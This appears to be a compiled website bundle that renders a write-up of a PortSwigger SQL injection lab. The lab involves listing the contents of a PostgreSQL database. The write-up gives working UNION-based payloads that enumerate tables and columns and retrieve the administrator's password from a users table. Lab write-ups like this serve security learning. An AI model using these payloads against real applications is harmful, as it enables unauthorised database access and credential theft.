"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[4027],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return m}});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),d=c(n),m=r,g=d["".concat(l,".").concat(m)]||d[m]||u[m]||o;return n?a.createElement(g,i(i({ref:t},p),{},{components:n})):a.createElement(g,i({ref:t},p))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:r,i[1]=s;for(var c=2;c<o;c++)i[c]=n[c];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},6598:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return c},toc:function(){return p},default:function(){return d}});var a=n(7462),r=n(3366),o=(n(7294),n(3905)),i=["components"],s={},l="Lab: SQL injection attack, listing the database contents on non-Oracle databases",c={unversionedId:"PortSwigger/SQL Injection/Lab 09",id:"PortSwigger/SQL Injection/Lab 09",isDocsHomePage:!1,title:"Lab: SQL injection attack, listing the database contents on non-Oracle databases",description:"Task",source:"@site/docs/PortSwigger/SQL Injection/Lab 09.md",sourceDirName:"PortSwigger/SQL Injection",slug:"/PortSwigger/SQL Injection/Lab 09",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 09",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/PortSwigger/SQL Injection/Lab 09.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 08"},next:{title:"Lab: SQL injection attack, listing the database contents on Oracle",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 10"}},p=[{value:"Task",id:"task",children:[]},{value:"Solution",id:"solution",children:[{value:"Exploit",id:"exploit",children:[]},{value:"Login",id:"login",children:[]}]}],u={toc:p};function d(e){var t=e.components,n=(0,r.Z)(e,i);return(0,o.kt)("wrapper",(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases"},"Lab: SQL injection attack, listing the database contents on non-Oracle databases"),(0,o.kt)("h2",{id:"task"},"Task"),(0,o.kt)("p",null,"This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables."),(0,o.kt)("p",null,"The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users."),(0,o.kt)("p",null,"To solve the lab, log in as the ",(0,o.kt)("inlineCode",{parentName:"p"},"administrator")," user."),(0,o.kt)("h2",{id:"solution"},"Solution"),(0,o.kt)("h3",{id:"exploit"},"Exploit"),(0,o.kt)("p",null,"Steps to explore the number of columns returned in the response as well as which column is string-compatible are the same as previous labs.  "),(0,o.kt)("p",null,"To check which database it is, I queried the version of the database and the one of PostgreSql works, which means this database is PostgreSql.  "),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130075282-43dff783-130b-4aa5-ba5a-8855f2c60e88.png",alt:"image"})),(0,o.kt)("p",null,"To view all table names, the payload is:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"/filter?category=Pets'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--\n")),(0,o.kt)("p",null,"As the result, the table that is likely to contain ",(0,o.kt)("inlineCode",{parentName:"p"},"username")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"password")," is ",(0,o.kt)("inlineCode",{parentName:"p"},"users_erggze"),":  "),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130074155-4594456b-6697-4c6f-a675-277074fc68f8.png",alt:"image"}),"  "),(0,o.kt)("p",null,"Then, to explore the column names in the ",(0,o.kt)("inlineCode",{parentName:"p"},"users_erggze")," table, the payload is:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"/filter?category=Pets'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_erggze'--\n")),(0,o.kt)("p",null,"In the response, the columns that contain ",(0,o.kt)("inlineCode",{parentName:"p"},"username")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"password")," are ",(0,o.kt)("inlineCode",{parentName:"p"},"username_kaddvg")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"password_gtnezs")," :  "),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130074473-8a0b61f1-8855-4743-94d3-e32fc0492578.png",alt:"image"})),(0,o.kt)("p",null,"To retrieve the password of the ",(0,o.kt)("inlineCode",{parentName:"p"},"administrator")," user, the following payload is used:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"/filter?category=Pets'+UNION+SELECT+username_kaddvg,password_gtnezs+FROM+users_erggze+WHERE+username_kaddvg='administrator'--\n")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130074809-af78354d-6b1e-4504-bb35-84dfe9508b68.png",alt:"image"})),(0,o.kt)("h3",{id:"login"},"Login"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130074922-298ce292-30ad-4760-8cb7-2b18ebbfe6cf.png",alt:"image"}),"  "),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130074982-13fca45d-8c3b-4917-8a2e-0f03c1be3a55.png",alt:"image"})),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Solved!")))}d.isMDXComponent=!0}}]);